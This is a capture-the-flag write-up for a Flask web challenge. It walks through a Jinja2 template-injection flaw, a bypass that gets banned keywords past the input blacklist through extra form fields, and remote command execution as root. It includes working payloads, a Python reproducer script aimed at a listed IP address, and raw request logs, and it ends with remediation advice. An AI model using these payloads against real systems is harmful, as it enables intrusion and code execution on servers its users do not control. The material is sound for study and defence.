# Ginger Juice Shop — CTF Writeup

**Challenge:** Ginger Juice Shop (350 pts)
**Category:** Web
**Target:** `http://54.72.82.22:8050`
**Flag:** `safctf{42dd8c3f359acdfc9b4250f4864ffc35}`
**Vulnerability:** Server-Side Template Injection (SSTI, Jinja2) → RCE as root
**Difficulty:** Medium — the blacklist is real but applied to the wrong scope

---

## 1. Summary

The application is a Flask app that renders user input directly into a Jinja2 template
via `render_template_string()`. A blacklist of dangerous substrings guards the `name`
form field, but **only that field**. Because Jinja2 exposes the Flask `request` object
to templates, any *other* form field can be read back inside the template with
`request.form.<key>` — letting an attacker smuggle every banned substring past the
filter and achieve full remote code execution as `root`.

The flag was available as the `FLAG` environment variable in the process.

---

## 2. Reconnaissance

### 2.1 Service fingerprint

```
$ nmap -Pn -sV -p 8050 --version-intensity 5 54.72.82.22
PORT     STATE SERVICE VERSION
8050/tcp open  http    Werkzeug httpd 3.1.9 (Python 3.11.16)
```

Werkzeug dev server → Flask + Jinja2.

### 2.2 Application surface

`GET /` returns a themed "CITRUS STUDIO" landing page with a single form:

```html
<h1>Lock Up The Usual Suspects</h1>
<form method="POST" action="/">
  <input type="text" name="name" placeholder="Enter your name" required>
  <input type="submit" value="Submit">
</form>
```

Directory brute-forcing `/api/*`, `/admin`, `/menu`, `/orders`, `/health`, etc. returned
nothing — this is **not** the same multi-variant service as the sibling challenges. The
only other route is `POST /greet` (405 on GET), discovered by method probing.

### 2.3 Reflection vs. evaluation

| Request | Response |
|---|---|
| `POST /` `name=alice` | `<h2>Hello, alice! Did you find the suspects yet?</h2>` |
| `POST /` `name={{7*7}}` | `<h2>Hello, 49! Did you find the suspects yet?</h2>` |
| `POST /` `name=${7*7}` | `${7*7}` (literal) |
| `POST /` `name=<%= 7*7 %>` | `<%= 7*7 %>` (literal) |
| `POST /` `name={{7*'7'}}` | `7777777` |

`{{7*7}}` → `49` and `{{7*'7'}}` → `7777777` are the classic Jinja2 (Python) signatures —
Twig would have produced `49` for both. **Confirmed: Jinja2 SSTI on `POST /`.**

---

## 3. Vulnerability analysis

### 3.1 The vulnerable handler

Recovered from the container (see §4.2) — `/app/app.py`:

```python
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        name = request.form.get('name', '')

        # Basic input validation to block common SSTI patterns
        blacklist = ['__', 'class', 'mro', 'subclasses', 'eval', 'exec', 'os', 'sys', 'config']
        if any(keyword in name for keyword in blacklist):
            return "Invalid input detected! You might need to Try Hard!!", 400

        template = '''
            ...
            <h2>Hello, ''' + name + '''! Find The Suspects!</h2>
            ...
        '''
        return render_template_string(template)
```

Two things stand out: the **string concatenation** into a template source (not
`render_template` with a variable), and the blacklist's **scope**.

### 3.2 Defect 1 — Blacklists cannot secure a template engine

The list blocks `__`, `class`, `mro`, `subclasses`, `eval`, `exec`, `os`, `sys`,
`config`. Verified blocking behaviour:

| Payload | Result |
|---|---|
| `{{config}}` | 400 blocked |
| `{{''.__class__}}` | 400 blocked |
| `{{lipsum.__globals__}}` | 400 blocked (`__`) |
| `{{lipsum.globals}}` | 200 (evaluates to `''` — no such attribute) |
| `{{cycler}}` | 200 → `<class 'jinja2.utils.Cycler'>` |
| `{{lipsum}}` | 200 → `<function generate_lorem_ipsum at 0x...>` |

Even a well-scoped blacklist is the wrong control here: Jinja2 has a large standard
object surface (`lipsum`, `cycler`, `joiner`, `namespace`, `self`, `request`,
`url_for`, `get_flashed_messages`) and unbounded ways to spell an attribute name.

### 3.3 Defect 2 — The filter only inspects one field (the actual bypass)

`request.form.get('name')` is validated — but the template is rendered in the context
of the whole request, where **every** form field is reachable as `request.form.<key>`:

```jinja
{{ request.form.x }}
```

Sending `name={{request.form.x}}&x=__globals__` renders `__globals__` — the banned
string travelled through a field the blacklist never looked at. **This is the whole
bypass.** The blacklist is a filter on input that isn't the only input.

### 3.4 Defect 3 — RCE as root

Chaining the smuggled strings through `|attr()` (the `attr` filter applies the `getattr`
builtin and takes the attribute name as *data*, so no banned literal ever appears in the
template source):

```
lipsum                        → a function in the template globals
|attr('__globals__')          → its module globals dict
|attr('__getitem__')('os')    → the os module
|attr('popen')(cmd)           → os.popen(cmd)
|attr('read')()               → command output
```

The container runs as `uid=0(root)`.

---

## 4. Exploitation

### 4.1 Step 1 — Confirm SSTI

```
POST /  name={{7*7}}
→ <h2>Hello, 49! Did you find the suspects yet?</h2>
```

### 4.2 Step 2 — Probe the blacklist and find the scope flaw

Individual keyword probes localise the filter:

```
BLOCK  'os'        ok  'popen'      BLOCK  'class'
BLOCK  'system'    ok  'init'       BLOCK  'config'
BLOCK  'mro'       ok  'globals'    BLOCK  '__'
BLOCK  'subclasses' ok 'builtins'
```

Then the scope test — `__globals__` (a banned string) passed via a second field:

```
POST /  name={{request.form.x}}&x=__globals__

HTTP/1.1 200          ← NOT blocked
→ <h2>Hello, __globals__! ...
```

The filter does not scan the full body. Bypass found.

### 4.3 Step 3 — Build the RCE chain

Template source (contains **no** banned substring — note the absence of `.`, `_`, `os`,
`class`, `config`):

```
{{lipsum|attr(request.form.a)|attr(request.form.b)(request.form.c)|attr(request.form.d)(request.form.e)|attr(request.form.f)()}}
```

Request body:

```
name={{lipsum|attr(request.form.a)|attr(request.form.b)(request.form.c)|attr(request.form.d)(request.form.e)|attr(request.form.f)()}}
&a=__globals__
&b=__getitem__
&c=os
&d=popen
&e=id
&f=read
```

Result:

```html
<h2>Hello, uid=0(root) gid=0(root) groups=0(root)! Find The Suspects!</h2>
```

**Remote code execution as root.**

### 4.4 Step 4 — Read the flag

Setting `e=env`:

```
HOSTNAME=54820c139049
HOME=/root
PYTHONUNBUFFERED=1
FLASK_RUN_FROM_CLI=true
...
PWD=/app
FLAG=safctf{42dd8c3f359acdfc9b4250f4864ffc35}
```

### 4.5 Step 5 — Source disclosure (post-exploitation)

`cat /app/app.py` returned the full organizer source, confirming the blacklist and the
`render_template_string()` sink. Also notable: a hardcoded Flask secret key.

```python
app.secret_key = "VjJGeklHbDBJSEpsWVd4c2VTQnpkWEJ3YjNObFpDQjBieUJpWlNCelpXTnlaWFJwZG1VLw=="
```

That value is itself double-Base64 and decodes to a taunt:

```
L1: V2FzIGl0IHJlYWxseSBzdXBwb3NlZCB0byBiZSBzZWNyZXRpdmU/
L2: Was it really supposed to be secretive?
```

— a nod to the fact that a leaked `secret_key` (which this SSTI just leaked) enables
session forgery.

The companion route `POST /greet` is a second, **unfiltered** SSTI sink
(`name` concatenated straight into `render_template_string` with no blacklist at all) —
a one-request RCE that makes the `/` blacklist entirely cosmetic.

---

## 5. Flag

```
safctf{42dd8c3f359acdfc9b4250f4864ffc35}
```

---

## 6. Root cause & remediation

**Root cause:** untrusted input is concatenated into Jinja2 template source and
evaluated. The compensating control (a substring blacklist) is both fundamentally
unsuitable and applied to only one of the request's inputs, so it is bypassed twice
over — first by attribute-name smuggling, second by the `request.form` side channel.

**Fixes, in order of importance:**

1. **Never build templates from user input.** Use `render_template()` with the value
   passed as a variable — Jinja2 autoescaping then treats it as inert data:

   ```python
   return render_template('index.html', name=name)   # {# {{ name }} in the template #}
   ```

   If dynamic templates are a genuine requirement, use `jinja2.sandbox.SandboxedEnvironment`
   and an **allowlist** of permitted variables and attributes.

2. **Delete the blacklist.** `['__','class','mro',...]` cannot be completed — Jinja2's
   object graph is unbounded (`|attr`, `|map`, `|select`, `request.*`, `lipsum`,
   `cycler`, `namespace`, `self`, string building with `~`, `{%set%}`, …). Allowlists
   of *values*, not denylists of *strings*, are the only sound approach.

3. **Do not rely on filtering one field.** Any control must cover the whole request.
   Here the `request` object itself was the bypass channel — a reminder that template
   context is an input surface too.

4. **Least privilege.** The process ran as `uid=0`. A dedicated non-root user and a
   read-only root filesystem would have contained the impact.

5. **Rotate the secret.** The Flask `secret_key` was committed to the image and
   disclosed by the SSTI; it must be considered compromised.

---

## 7. References

* HackTricks — *Server Side Template Injection (SSTI)* / Jinja2 exploitation
  (sourced via BlackBook `knowledge_research`)
* PortSwigger Web Security Academy — *Server-side template injection*
* Jinja2 docs — `SandboxedEnvironment`, `render_template_string` misuse
* OWASP — *Code Injection* / *Server-Side Template Injection*

---

## Appendix A — Reproducer script

```python
#!/usr/bin/env python3
"""Ginger Juice Shop — Jinja2 SSTI to RCE (CWE-94).

Bypass: the blacklist ['__','class','mro','subclasses','eval','exec','os','sys','config']
is applied only to the `name` field. Every banned substring is smuggled through other
form fields and read back inside the template via request.form.<key> + the |attr filter.
"""
import re, sys
import urllib.parse, urllib.request

BASE = "http://54.72.82.22:8050"

# No banned substring (and no '.') appears in this template source.
PAYLOAD = ("{{lipsum|attr(request.form.a)|attr(request.form.b)(request.form.c)"
           "|attr(request.form.d)(request.form.e)|attr(request.form.f)()}}")


def rce(cmd: str) -> str:
    """lipsum.__globals__['os'].popen(cmd).read()"""
    data = urllib.parse.urlencode({
        "name": PAYLOAD,
        "a": "__globals__",      # banned substring, smuggled
        "b": "__getitem__",
        "c": "os",               # banned substring, smuggled
        "d": "popen",
        "e": cmd,
        "f": "read",
    }).encode()
    req = urllib.request.Request(BASE + "/", data=data)
    with urllib.request.urlopen(req, timeout=20) as r:
        body = r.read().decode()
    m = re.search(r"<h2>Hello, (.*?)! Did you find", body, re.S)
    return m.group(1).strip() if m else f"(no match)\n{body[-300:]}"


if __name__ == "__main__":
    cmd = " ".join(sys.argv[1:]) or "id"
    out = rce(cmd)
    print(out)
    if cmd == "id" or not sys.argv[1:]:
        env = rce("env")
        flag = next((l for l in env.splitlines() if l.startswith("FLAG=")), None)
        if flag:
            print("\n[+] " + flag)
```

## Appendix B — Raw evidence (trimmed)

```
# 1. SSTI confirmed
POST /  name={{7*7}}
→ <h2>Hello, 49! Did you find the suspects yet?</h2>

# 2. Blacklist probed
POST /  name={{config}}
→ HTTP 400  Invalid input detected! You might need to Try Hard!!

# 3. Scope flaw: banned string through a second field
POST /  name={{request.form.x}}&x=__globals__
→ HTTP 200  <h2>Hello, __globals__! ...

# 4. RCE
POST /  name={{lipsum|attr(request.form.a)|attr(request.form.b)(request.form.c)|attr(request.form.d)(request.form.e)|attr(request.form.f)()}}
        &a=__globals__&b=__getitem__&c=os&d=popen&e=id&f=read
→ <h2>Hello, uid=0(root) gid=0(root) groups=0(root)! ...

# 5. Flag
        &e=env
→ ... FLAG=safctf{42dd8c3f359acdfc9b4250f4864ffc35}
```

### Blacklist reference (from `/app/app.py`)

```python
blacklist = ['__', 'class', 'mro', 'subclasses', 'eval', 'exec', 'os', 'sys', 'config']
if any(keyword in name for keyword in blacklist):   # ← only `name`, not the request
    return "Invalid input detected! You might need to Try Hard!!", 400
```
